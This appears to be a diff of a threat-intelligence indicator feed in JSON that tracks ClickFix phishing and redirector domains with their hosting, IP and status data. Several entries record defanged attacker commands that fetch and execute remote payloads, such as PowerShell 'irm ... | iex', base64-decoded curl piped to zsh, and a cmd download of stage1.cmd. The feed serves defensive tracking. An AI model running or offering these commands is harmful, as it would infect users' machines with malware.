     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
+   ]
+  },
+  {
+   "indicator": "lucasmed.co.kr",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://www.lucasmed.co.kr/",
+   "brand": null,
+   "product": null,
+   "hosting": "Amazon AWS",
+   "dns": "dothome.co.kr",
+   "ip": "3.34.68.148",
+   "asn": "AS16509",
+   "org": "AMAZON-02 - Amazon.com, Inc., US",
+   "country": "KR",
+   "ips": [
+    {
+     "ip": "3.34.68.148",
+     "asn": "AS16509",
+     "org": "AMAZON-02 - Amazon.com, Inc., US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.lucasmed.co.kr",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
+   ],
+   "connects_to": [
+    "escapeai.live",
+    "copiose.org"
+   ],
+   "lure_from": [
+    "cloudeccentric.cc"
    ]
   },
   {
@@ -159625,8 +160337,9 @@
     "groverudder12.com"
    ],
    "lure_from": [
+    "interseq.at",
     "ncheck-brows.beer",
-    "interseq.at"
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -170654,13 +171367,14 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
+    "lepafonso.bz",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -184249,6 +184963,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "pakistanskimalchik.org",
     "ktoktotam.cc"
    ]
@@ -188206,10 +188921,10 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "unknown",
+   "status": "online",
    "first_seen": "2026-10-20",
-   "last_seen": "2026-11-05",
-   "last_online": "2026-11-04",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
    "offline_since": null,
    "url": "https://api-gofiq8bn7.rcgers-machinery.com/",
    "brand": null,
@@ -188226,15 +188941,15 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-11-05"
+     "last_seen": "2026-11-06"
     }
    ],
    "hosts": [
     {
      "host": "api-gofiq8bn7.rcgers-machinery.com",
-     "status": "unknown",
+     "status": "online",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-11-05"
+     "last_seen": "2026-11-06"
     }
    ],
    "actor": null,
@@ -190795,6 +191510,60 @@
    ]
   },
   {
+   "indicator": "residens.hu",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-02",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://residens.hu/",
+   "brand": null,
+   "product": null,
+   "hosting": "Contabo",
+   "dns": "chsel.eu",
+   "ip": "173.249.9.23",
+   "asn": "AS51167",
+   "org": "CONTABO Contabo GmbH, DE",
+   "country": "FR",
+   "ips": [
+    {
+     "ip": "173.249.9.23",
+     "asn": "AS51167",
+     "org": "CONTABO Contabo GmbH, DE",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "residens.hu",
+     "status": "online",
+     "first_seen": "2026-11-02",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+   ],
+   "connects_to": [
+    "trustchecknes.com",
+    "hagosuro.lc",
+    "xorados.com",
+    "trek-72.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "resiliencegonewild.com",
    "type": "domain",
    "category": "clickfix",
@@ -191740,6 +192509,53 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/Grog1274/ec73471d-b7e6-4a5f-bcfd-[id]/7d4-8230-404f-9874-[id] | IEX"
    ],
    "connects_to": [],
+   "lure_from": []
+  },
+  {
+   "indicator": "rgrcarkeys.co.uk",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "http://rgrcarkeys.co.uk/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "GoDaddy",
+   "ip": "160.153.0.169",
+   "asn": "AS209242",
+   "org": "Cloudflare London, LLC",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "160.153.0.169",
+     "asn": "AS209242",
+     "org": "Cloudflare London, LLC",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "rgrcarkeys.co.uk",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "codes.browse-cdn.beer"
+   ],
    "lure_from": []
   },
   {
@@ -193634,6 +194450,55 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "rkfashionshop.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://rkfashionshop.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "exonhost.com",
+   "ip": "46.202.163.43",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger International Limited, CY",
+   "country": "IN",
+   "ips": [
+    {
+     "ip": "46.202.163.43",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "rkfashionshop.com",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "rkspl.in",
@@ -216128,6 +216993,53 @@
    "lure_from": []
   },
   {
+   "indicator": "st-shop.nl",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://st-shop.nl/",
+   "brand": null,
+   "product": null,
+   "hosting": "Sucuri",
+   "dns": "european-server.com",
+   "ip": "192.124.249.84",
+   "asn": "AS30148",
+   "org": "SUCURI-SEC - Sucuri, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "192.124.249.84",
+     "asn": "AS30148",
+     "org": "SUCURI-SEC - Sucuri, US",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "st-shop.nl",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "cmd /c start /min cmd /c \"curl -sko %tmp%\\~u.cmd hxxps[:]//physioga[.]net/u/stage1.cmd&%tmp%\\~u.cmd\""
+   ],
+   "connects_to": [
+    "physioga.net"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "st666.show",
    "type": "domain",
    "category": "clickfix",
@@ -216744,7 +217656,8 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -227159,7 +228072,8 @@
    ],
    "lure_from": [
     "makeverizyjar.info",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -237584,7 +238498,9 @@
    ],
    "lure_from": [
     "btorsercoyt31.cc",
-    "checkogosdfg33.cc"
+    "checkogosdfg33.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -244352,6 +245268,53 @@
    "connects_to": [
     "gfisoda.biz",
     "hagosuro.lc"
+   ],
+   "lure_from": []
+  },
+  {
+   "indicator": "velkomiloev.com",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-06",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-06",
+   "offline_since": null,
+   "url": "https://velkomiloev.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "DigitalOcean",
+   "dns": "bgdns.net",
+   "ip": "139.59.137.147",
+   "asn": "AS14061",
+   "org": "DigitalOcean, LLC",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "139.59.137.147",
+     "asn": "AS14061",
+     "org": "DigitalOcean, LLC",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "velkomiloev.com",
+     "status": "online",
+     "first_seen": "2026-11-06",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "codes.browse-cdn.beer"
    ],
    "lure_from": []
   },
@@ -251318,7 +252281,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "8hg4roxu.bossbeymaster.click"
    ],
    "lure_from": []
   },
@@ -252860,10 +253824,7 @@
     "eventwireix.com",
     "metricserveonline.com",
     "ncheck-brows.beer",
-    "codes.caffe-img.com",
-    "jscdncloude.beer",
-    "id-verfied.boats",
-    "cloud-browse.codes"
+    "codes.caffe-img.com"
    ]
   },
   {
